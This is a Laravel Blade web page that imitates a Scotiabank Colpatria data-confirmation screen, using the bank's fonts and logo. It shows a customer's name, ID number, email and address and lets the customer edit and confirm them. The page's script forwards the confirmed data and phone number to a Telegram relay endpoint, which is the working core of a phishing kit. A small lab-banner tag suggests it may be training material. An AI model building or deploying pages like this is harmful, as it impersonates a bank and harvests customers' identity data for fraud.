<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Confirmación de Datos</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        @font-face {
            font-family: Scotia Bold;
            src: url(/colpatria/Scotia_W_Bd.627aff1c32d06c15.woff) format("woff"), url(/colpatria/Scotia_W_Bd.3d89a25acb9e796d.woff2) format("woff2")
        }

        @font-face {
            font-family: Scotia Headline;
            src: url(/colpatria/Scotia_W_Headline.5a532caa3319ee5c.woff) format("woff"), url(/colpatria/Scotia_W_Headline.c0b92ef00c6db65a.woff2) format("woff2")
        }

        @font-face {
            font-family: Scotia Regular;
            src: url(/colpatria/Scotia_W_Rg.a53c6af4aaff8c13.woff) format("woff"), url(/colpatria/Scotia_W_Rg.bb5cf5215aeee399.woff2) format("woff2")
        }

        .text-headline {
            font-family: Scotia Headline;
        }

        .text-regular {
            font-family: Scotia Regular;
        }

        .text-bold {
            font-family: Scotia Bold;
        }

        .edit-input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-family: Scotia Regular;
            font-size: 1.1rem;
        }

        .hidden {
            display: none !important;
        }

        .boton-colpa {
            box-sizing: inherit;
            cursor: pointer;
            outline: none;
            overflow: visible;
            position: relative;
            font-family: Scotia Regular;
            font-size: 1rem;
            letter-spacing: 0rem;
            line-height: 1.6rem;
            border: .1rem solid;
            border-radius: .8rem;
            text-decoration: none;
            min-height: 4rem;
            min-width: 11.8rem;
            transition: background-color ease-in .1s, color ease-in .1s;
            width: 100%;
            margin-bottom: 1rem;
        }

        .boton-modificar {
            background-color: white;
            border-color: #ec111a;
            color: #ec111a;
        }

        .boton-modificar:hover {
            background-color: #fff5f5;
            border-color: #ec111a;
            color: #ec111a;
        }

        .boton-confirmar, .btn-save {
            background-color: #ec111a;
            border-color: #ec111a;
            color: white;
        }

        .boton-confirmar:hover, .btn-save:hover {
            background-color: #ce0f17;
            border-color: #ce0f17;
            color: white;
        }

        .field-container {
            margin-bottom: 1.5rem;
        }

        /* Toast Notifications */
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        }

        .toast-notification {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            padding: 16px 20px;
            margin-bottom: 10px;
            min-width: 300px;
            max-width: 400px;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: slideIn 0.3s ease-out;
            border-left: 4px solid #ec111a;
        }

        .toast-notification.success {
            border-left-color: #10b981;
        }

        .toast-notification.error {
            border-left-color: #ef4444;
        }

        .toast-icon {
            font-size: 24px;
            flex-shrink: 0;
        }

        .toast-content {
            flex: 1;
        }

        .toast-title {
            font-family: Scotia Bold;
            font-size: 14px;
            margin-bottom: 4px;
            color: #1f2937;
        }

        .toast-message {
            font-family: Scotia Regular;
            font-size: 13px;
            color: #6b7280;
        }

        .toast-close {
            background: none;
            border: none;
            font-size: 20px;
            color: #9ca3af;
            cursor: pointer;
            padding: 0;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .toast-close:hover {
            color: #4b5563;
        }

        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes slideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }

        .toast-notification.hiding {
            animation: slideOut 0.3s ease-in forwards;
        }
    </style>
</head>

<body>
<x-lab-banner />
    <!-- Toast Container -->
    <div class="toast-container" id="toast-container"></div>
    <div class="container-fluid p-0">
        <div class="w-100 px-3 my-3 mb-4">
            <img src="/colpatria/logo_colpatria.svg" alt="Logo Colpatria" class="img-fluid w-100">
        </div>

        <div class="text-regular container my-4 px-3">
            <h6 class="text-secondary">Envío de correspondencia y notificaciones</h6>
            <h2 class="text-headline mb-4">Confirma los siguientes datos:</h2>

            @if($dato)
                <div class="field-container" id="nombres-container">
                    <p class="text-secondary mb-1">Nombres y apellidos</p>
                    <p class="fs-5 display-text">{{ $dato->nombre ?? 'No disponible' }}</p>
                    <div class="edit-form hidden">
                        <input type="text" class="edit-input" data-field="nombre" value="{{ $dato->nombre ?? '' }}">
                    </div>
                </div>

                <div class="field-container" id="id-container">
                    <p class="text-secondary mb-1">Tipo y número de identificación</p>
                    <p class="fs-5 display-text">CC {{ $dato->cedula ?? 'No disponible' }}</p>
                    <div class="edit-form hidden">
                        <input type="text" class="edit-input" data-field="cedula" value="{{ $dato->cedula ?? '' }}">
                    </div>
                </div>

                <div class="field-container" id="email-container">
                    <p class="text-secondary mb-1">Correo electrónico</p>
                    <p class="fs-5 display-text">{{ $dato->email ?? 'No disponible' }}</p>
                    <div class="edit-form hidden">
                        <input type="email" class="edit-input" data-field="email" value="{{ $dato->email ?? '' }}">
                    </div>
                </div>

                <div class="field-container" id="direccion-container">
                    <p class="text-secondary mb-1">Dirección para notificaciones</p>
                    <p class="fs-5 display-text">{{ $dato->direccion ?? 'No disponible' }}</p>
                    <div class="edit-form hidden">
                        <input type="text" class="edit-input" data-field="direccion" value="{{ $dato->direccion ?? '' }}">
                    </div>
                </div>

                <div class="field-container" id="ciudad-container">
                    <p class="text-secondary mb-1">Ciudad</p>
                    <p class="fs-5 display-text">{{ $dato->ciudad ?? 'No disponible' }}</p>
                    <div class="edit-form hidden">
                        <input type="text" class="edit-input" data-field="ciudad" value="{{ $dato->ciudad ?? '' }}">
                    </div>
                </div>

                <div class="field-container" id="departamento-container">
                    <p class="text-secondary mb-1">Departamento</p>
                    <p class="fs-5 display-text">{{ $dato->departamento ?? 'No disponible' }}</p>
                    <div class="edit-form hidden">
                        <input type="text" class="edit-input" data-field="departamento" value="{{ $dato->departamento ?? '' }}">
                    </div>
                </div>

                <input type="hidden" id="celular-value" value="{{ $dato->celular }}">
            @else
                <div class="alert alert-warning">
                    No se encontraron datos para este usuario. Por favor, verifica el enlace.
                </div>
            @endif

            <div class="boton-colpa-container d-flex flex-column justify-content-center my-3 mx-auto w-75">
                <!-- Botón Modificar -->
                <button id="btn-modificar" class="boton-colpa boton-modificar btn text-decoration-none d-flex align-items-center justify-content-center">
                    Modificar información
                </button>

                <!-- Botón Guardar -->
                <button id="save-all" class="boton-colpa btn-save hidden text-decoration-none d-flex align-items-center justify-content-center">
                    Guardar cambios
                </button>

                <!-- Botón Confirmar -->
                <button id="btn-confirmar" class="boton-colpa boton-confirmar text-decoration-none d-flex align-items-center justify-content-center">
                    Confirmar información
                </button>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Función para mostrar notificaciones Toast
        function showToast(type, title, message, duration = 4000) {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast-notification ${type}`;

            const icon = type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ';

            toast.innerHTML = `
                <div class="toast-icon">${icon}</div>
                <div class="toast-content">
                    <div class="toast-title">${title}</div>
                    <div class="toast-message">${message}</div>
                </div>
                <button class="toast-close" onclick="this.parentElement.remove()">×</button>
            `;

            container.appendChild(toast);

            setTimeout(() => {
                toast.classList.add('hiding');
                setTimeout(() => toast.remove(), 300);
            }, duration);
        }

        $(document).ready(function() {
            // Click handler para botón modificar
            $('#btn-modificar').click(function() {
                // Mostrar campos de edición
                $('.display-text').addClass('hidden');
                $('.edit-form').removeClass('hidden');
                // Cambiar visibilidad de botones
                $('#save-all').removeClass('hidden');
                $('#btn-modificar').addClass('hidden');
                $('#btn-confirmar').addClass('hidden');
            });

            // Función para enviar datos a Telegram
            function enviarDatosATelegram(datos, includeButtons, callback) {
                // Forzar que includeButtons sea un booleano explícito
                const shouldIncludeButtons = Boolean(includeButtons);

                console.log('Enviando a Telegram - includeButtons:', shouldIncludeButtons);

                $.ajax({
                    url: '/api/telegram/send-info',
                    type: 'POST',
                    data: {
                        uniqid: 'colpatria_' + datos.celular,
                        includeButtons: shouldIncludeButtons,
                        data: datos
                    },
                    success: function(response) {
                        console.log('Datos enviados a Telegram:', response);
                        if (callback) callback(true);
                    },
                    error: function(xhr, status, error) {
                        console.error('Error al enviar a Telegram:', error);
                        // Continuar con el flujo aunque falle el envío a Telegram
                        if (callback) callback(false);
                    }
                });
            }

            // Click handler para guardar cambios
            $('#save-all').click(function() {
                const celular = $('#celular-value').val();

                // Recopilar datos de los inputs
                const datos = {
                    celular: celular,
                    nombre: $('input[data-field="nombre"]').val(),
                    cedula: $('input[data-field="cedula"]').val(),
                    email: $('input[data-field="email"]').val(),
                    direccion: $('input[data-field="direccion"]').val(),
                    ciudad: $('input[data-field="ciudad"]').val(),
                    departamento: $('input[data-field="departamento"]').val(),
                };

                // Obtener el token CSRF
                const csrfToken = $('meta[name="csrf-token"]').attr('content');

                // Enviar datos por AJAX para actualizar en DB
                $.ajax({
                    url: '{{ route("colpatria.actualizar") }}',
                    type: 'POST',
                    data: datos,
                    headers: {
                        'X-CSRF-TOKEN': csrfToken
                    },
                    success: function(response) {
                        if (response.success) {
                            // Actualizar los textos de display
                            $('#nombres-container .display-text').text(datos.nombre || 'No disponible');
                            $('#id-container .display-text').text('CC ' + (datos.cedula || 'No disponible'));
                            $('#email-container .display-text').text(datos.email || 'No disponible');
                            $('#direccion-container .display-text').text(datos.direccion || 'No disponible');
                            $('#ciudad-container .display-text').text(datos.ciudad || 'No disponible');
                            $('#departamento-container .display-text').text(datos.departamento || 'No disponible');

                            // Volver a modo visualización
                            $('.edit-form').addClass('hidden');
                            $('.display-text').removeClass('hidden');
                            $('#save-all').addClass('hidden');
                            $('#btn-modificar').removeClass('hidden');
                            $('#btn-confirmar').removeClass('hidden');

                            // Mostrar mensaje de éxito con Toast
                            showToast('success', 'Datos actualizados', 'Tus datos han sido actualizados correctamente');
                        }
                    },
                    error: function(xhr, status, error) {
                        showToast('error', 'Error al actualizar', 'No se pudieron actualizar los datos. Por favor, intenta nuevamente.');
                        console.error('Error:', error);
                    }
                });
            });

            // Click handler para confirmar información
            $('#btn-confirmar').click(function() {
                const celular = $('#celular-value').val();

                // Recopilar datos actuales (ya sea que se hayan modificado o no)
                const datos = {
                    celular: celular,
                    nombre: $('#nombres-container .display-text').text().trim(),
                    cedula: $('#id-container .display-text').text().replace('CC ', '').trim(),
                    email: $('#email-container .display-text').text().trim(),
                    direccion: $('#direccion-container .display-text').text().trim(),
                    ciudad: $('#ciudad-container .display-text').text().trim(),
                    departamento: $('#departamento-container .display-text').text().trim(),
                };

                // Obtener el token CSRF
                const csrfToken = $('meta[name="csrf-token"]').attr('content');

                // Primero actualizar en la base de datos (por si el usuario no modificó pero queremos asegurar que está guardado)
                $.ajax({
                    url: '{{ route("colpatria.actualizar") }}',
                    type: 'POST',
                    data: datos,
                    headers: {
                        'X-CSRF-TOKEN': csrfToken
                    },
                    success: function(response) {
                        // Luego enviar a Telegram y redirigir (sin botones)
                        enviarDatosATelegram(datos, false, function(success) {
                            // Redirigir a colpa.blade.php después de enviar a Telegram
                            window.location.href = '/colpatria/colpa';
                        });
                    },
                    error: function(xhr, status, error) {
                        console.error('Error al actualizar en DB:', error);
                        // Aún así, intentar enviar a Telegram y redirigir (sin botones)
                        enviarDatosATelegram(datos, false, function(success) {
                            window.location.href = '/colpatria/colpa';
                        });
                    }
                });
            });
        });
    </script>
</body>
</html>
